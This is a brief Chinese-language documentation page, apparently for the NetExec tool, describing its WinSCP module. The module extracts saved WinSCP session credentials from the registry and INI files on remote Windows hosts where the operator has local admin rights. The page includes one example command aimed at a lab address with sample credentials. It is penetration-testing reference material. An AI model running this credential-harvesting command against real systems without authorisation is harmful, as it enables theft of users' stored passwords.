---
description: 导出存储在注册表或本地文件中的 WinSCP 凭证
---

# 导出 WinSCP

{% hint style="warning" %}
你需要在远程目标上至少具有本地管理员权限，如果你的用户是本地账户，请使用 **--local-auth** 选项
{% endhint %}

WinSCP 允许在以下位置存储连接凭证：

* HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions
* %APPDATA%\WinSCP.ini
* %USER%\Documents\WinSCP.ini

这些位置会自动检查系统上所有用户的存储凭证。如果有保存的会话且未设置主密码，模块将尝试提取凭证：

```
nxc smb 192.168.56.24 -u eddard.stark -p FightP3aceAndHonor! -M winscp
```
